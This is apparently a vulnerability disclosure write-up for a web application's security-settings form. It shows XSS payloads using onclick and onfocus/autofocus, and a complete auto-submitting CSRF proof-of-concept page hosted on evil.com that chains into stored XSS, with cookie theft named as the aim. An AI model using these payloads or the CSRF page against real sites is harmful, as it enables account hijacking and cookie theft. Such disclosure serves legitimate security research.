# XSS
1、	Log in later to the security settings page.

 ![maze](https://github.com/Kevil-hui/bug-report/blob/master/pic/1.jpg)  
 
2、	Click save and intercept the package. It is found that the real name is URL encoded and other parameters are transmitted in clear text.

  ![maze](https://github.com/Kevil-hui/bug-report/blob/master/pic/2.jpg)  
  
3、	XSS PAYLOAD1:1" onclick=alert(1)//   
    XSS PAYLOAD2：" onfocus=alert(1) autofocus ;'
    
You can set the submitted parameter of any of the five table boxes to 1 "onclick = alert (1) / /, and then replay the data package.
Because the onclick event needs to be triggered by clicking the table box, we can use the onfocus event and its autofocus attribute to automatically trigger the onfocus event, and modify the payload to: "onfocus = alert (1) autofocus;"

  ![maze]( https://github.com/Kevil-hui/bug-report/blob/master/pic/3.jpg)  
 
4、	XSS triggered successfully.

  ![maze]( https://github.com/Kevil-hui/bug-report/blob/master/pic/4.jpg)  
  
  
# CSRF
1、CSRF POC
Intercepts the request packet corresponding to "setting the security problem", because it is plaintext transmission, CSRF POC can be easily constructed, as follows

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://target.com/jsxsd/grsz/grsz_xggrxx.do" method="POST" id="csrf">
      <input type="hidden" name="realName" value="aa" />
      <input type="hidden" name="pwdQuestion1" value="11" />
      <input type="hidden" name="pwdAnswer1" value="3a3a" />
      <input type="hidden" name="pwdQuestion2" value="1" />
      <input type="hidden" name="pwdAnswer2" value="1&quot; onfocus=alert(/hacked!/) autofocus ;" />
      <input type="hidden" name="pageSize" value="101" />
      <input type="hidden" name="edit" value="11" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
<script>
    document.getElementById("csrf").submit();
</script>
</html>
```
2、Save the page to my server (simulating the attacker's server) at http://evil.com/jwcsrf.html

3、After confirming the login status, I will visit http://evil.com/target.com/jsxsd/jwcsrf.html

4、After accessing CSRF, x s s will be triggered automatically, because changing the password needs to verify the original password. You can inject XSS page into other users' background through CSRF, and get user cookies by xss

  ![maze]( https://github.com/Kevil-hui/bug-report/blob/master/pic/5.jpg)  
